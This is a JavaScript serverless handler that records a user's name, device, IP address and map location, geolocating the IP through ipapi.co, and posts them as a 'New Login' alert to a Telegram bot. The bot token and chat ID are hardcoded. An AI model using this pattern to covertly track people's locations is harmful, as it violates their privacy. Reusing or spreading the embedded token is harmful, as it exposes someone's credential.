export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, userAgent, location, comment } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown';

  // Clean up User-Agent to get a readable device string
  let deviceInfo = 'Unknown';
  if (userAgent) {
    const androidMatch = userAgent.match(/Android\s([\d.]+)/);
    const modelMatch = userAgent.match(/;\s([^;]+?)\s+Build/);
    if (androidMatch && modelMatch) {
      deviceInfo = `Android ${androidMatch[1]}, ${modelMatch[1]}`;
    } else if (androidMatch) {
      deviceInfo = `Android ${androidMatch[1]}`;
    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
      deviceInfo = 'iOS Device';
    } else if (userAgent.includes('Windows')) {
      deviceInfo = 'Windows PC';
    } else if (userAgent.includes('Macintosh')) {
      deviceInfo = 'Mac';
    } else {
      deviceInfo = userAgent.substring(0, 50);
    }
  }

  let mapLink = '';
  if (location && location.lat && location.lon) {
    mapLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
  } else {
    let lat = null, lon = null;
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      const geoData = await geoRes.json();
      lat = geoData.latitude;
      lon = geoData.longitude;
      if (lat && lon) {
        mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
      } else {
        const query = encodeURIComponent(`${geoData.city || ''}, ${geoData.region || ''}`);
        mapLink = `https://www.google.com/maps/search/?api=1&query=${query}`;
      }
    } catch (err) {
      console.error('IP geolocation failed:', err);
      mapLink = '';
    }
  }

  const timestamp = new Date().toLocaleString();

  // Build the message – include comment if provided
  let message = `🔐 *New Login*\n👤 User: ${username}\n📱 DEVICE : ${deviceInfo}\n🌍 DEVICE IP: ${ip}\n🗺️ [MAP LOCATION](${mapLink})\n⏰ Time: ${timestamp}`;

  if (comment && comment.trim() !== '') {
    message += `\n💬 COMMENT: ${comment.trim()}`;
  }

  // Telegram bot credentials
  const BOT_TOKEN = '7956448684:AAHA1Ka5G9NMAK-pHVnDADKg2AKS5gQhI5g';
  const CHAT_ID = '6941463365';

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
    const result = await response.json();
    if (!result.ok) throw new Error(result.description);
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Telegram error:', err);
    return res.status(500).json({ error: 'Failed to send notification' });
  }
}